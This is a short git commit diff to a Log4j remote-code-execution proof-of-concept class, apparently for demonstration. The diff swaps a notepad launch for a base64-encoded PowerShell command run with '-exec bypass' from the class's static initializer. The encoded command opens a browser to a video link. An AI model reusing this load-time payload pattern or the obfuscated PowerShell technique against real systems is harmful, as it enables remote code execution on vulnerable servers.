bad45914144a6b18efd44a0c25b426b85e01964e
David Bombal <davidbombal@gmail.com>
2021-12-14 13:27:56 +0200

    Update Log4jRCE.java

--- poc/Log4jRCE.java
+++ poc/Log4jRCE.java
@@ -3,7 +3,7 @@ public class Log4jRCE {
     static {
         
         try {
-            java.lang.Runtime.getRuntime().exec("notepad.exe").waitFor();
+            java.lang.Runtime.getRuntime().exec("powershell.exe -exec bypass -enc cwB0AGEAcgB0ACAAYwBoAHIAbwBtAGUAIABoAHQAdABwAHMAOgAvAC8AeQBvAHUAdAB1AC4AYgBlAC8AZABRAHcANAB3ADkAVwBnAFgAYwBRACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABtAGEAeABpAG0AaQB6AGUAZAANAAoA").waitFor();
         } catch (Exception e) {
             e.printStackTrace();
         }
